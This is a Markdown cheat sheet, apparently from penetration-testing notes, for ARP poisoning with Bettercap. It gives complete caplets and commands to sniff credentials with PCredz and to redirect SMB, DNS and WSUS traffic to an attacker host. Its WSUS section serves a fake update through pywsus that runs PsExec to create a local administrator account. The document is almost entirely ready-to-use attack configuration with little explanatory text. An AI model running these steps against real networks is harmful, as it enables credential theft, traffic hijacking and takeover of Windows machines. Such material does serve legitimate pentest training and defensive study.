# ARP Poisoning

## Tools: Bettercap, PCredz, pywsus 

Link: https://github.com/lgandx/PCredz and https://github.com/GoSecure/pywsus

## Use cases

# Dump Network Secrets

### 1) Create/modify config file

#### Bettercap config file

##### quick recon of the network
    net.probe on

##### set the ARP poisoning
    set arp.spoof.targets <target_IP>
    set arp.spoof.internal true
    set arp.spoof.fullduplex true

##### control logging and verbosity
    events.ignore endpoint
    events.ignore net.sniff.mdns

##### start the modules
    arp.spoof on
    net.sniff on

### 2) Run bettercap

    sudo ./bettercap --iface <interface> --caplet spoof.cap

### 3) Then sniff with Wireshark. When it is finish, save the trace in a .pcap file and extract the secrets:

    python3 ./Pcredz -f extract.pcap

# SMB Spoofing

### 1) Start the SMB server for capture or relay then start the poisoning attack.

##### quick recon of the network
    net.probe on

##### set the ARP spoofing
    set arp.spoof.targets $client_ip
    set arp.spoof.internal false
    set arp.spoof.fullduplex false

##### reroute traffic aimed at the original SMB server
    set any.proxy.iface $interface
    set any.proxy.protocol TCP
    set any.proxy.src_address $SMB_server_ip
    set any.proxy.src_port 445
    set any.proxy.dst_address $attacker_ip
    set any.proxy.dst_port 445

##### control logging and verbosity

    events.ignore endpoint
    events.ignore net.sniff.mdns

# start the modules

    any.proxy on
    arp.spoof on
    net.sniff on

### 2) Run bettercap OR responder

    sudo ./bettercap --iface <interface> --caplet spoof.cap

# DNS Spoofing

### 1) Start the DNS server (responder, dnschef, or bettercap) for DNS poisoning then start the ARP poisoning attack.

##### quick recon of the network
    net.probe on

##### set the ARP spoofing
   
    set arp.spoof.targets $client_ip
    set arp.spoof.internal false
    set arp.spoof.fullduplex false

##### reroute traffic aimed at the original DNS server
   
    set any.proxy.iface $interface
    set any.proxy.protocol UDP
    set any.proxy.src_address $DNS_server_ip
    set any.proxy.src_port 53
    set any.proxy.dst_address $attacker_ip
    set any.proxy.dst_port 53

##### control logging and verbosity

    events.ignore endpoint
    events.ignore net.sniff.mdns

##### start the modules

    any.proxy on
    arp.spoof on
    net.sniff on

### 2) Run bettercap OR responder OR DNSChef

        sudo ./bettercap --iface <interface> --caplet spoof.cap

# WSUS Spoofing (Windows Server Update Services)

ARP poisoning for WSUS spoofing in a two-subnets layout (attacker + client in the same segment, legitimate WSUS server in another one). Packets from the client to the WSUS server need to be hijacked and sent to the attacker's evil WSUS server. In order to do so, the attacker must pose as the client's gateway, route all traffic to the real gateway except the packets destined to the WSUS server.

### 1) The evil WSUS server needs to be started before doing ARP poisoning. The pywsus (Python) utility can be used for that matter.

    python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser /add && net localgroup Administrators testuser /add"'

### 2) Once the WSUS server is up and running, the ARP poisoning attack can start.

##### quick recon of the network

    net.probe on

##### set the ARP spoofing
    
    set arp.spoof.targets $client_ip
    set arp.spoof.internal false
    set arp.spoof.fullduplex false

##### reroute traffic aimed at the WSUS server

    set any.proxy.iface $interface
    set any.proxy.protocol TCP
    set any.proxy.src_address $WSUS_server_ip
    set any.proxy.src_port 8530
    set any.proxy.dst_address $attacker_ip
    set any.proxy.dst_port 8530

##### control logging and verbosity

    events.ignore endpoint
    events.ignore net.sniff.mdns

##### start the modules
 
    any.proxy on
    arp.spoof on
    net.sniff on

### 3) The caplet above can be loaded with the following command in order to launch the ARP poisoning attack.

    bettercap --iface $interface --caplet wsus_spoofing.cap

### 4) The search for Windows updates can be manually triggered when having access to the target computer by going to 

    Settings > Update & Security > Windows Update > Check for updates.



    
